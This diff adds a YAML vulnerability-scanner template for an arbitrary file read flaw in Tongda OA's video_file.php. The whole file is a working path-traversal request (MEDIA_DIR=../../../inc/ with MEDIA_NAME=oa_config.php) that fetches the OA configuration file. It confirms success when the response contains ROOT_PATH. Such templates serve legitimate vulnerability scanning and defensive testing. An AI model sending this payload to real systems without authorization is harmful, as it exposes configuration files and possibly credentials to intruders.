@@ -1,0 +1,23 @@
+info:
+  vulId: tongda_fileread_video_file
+  detail: 通达OA video_file.php任意文件读取
+  fofaQuery: title=""
+rules:
+  - request:
+      path: "{{rootUrl}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - ROOT_PATH
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
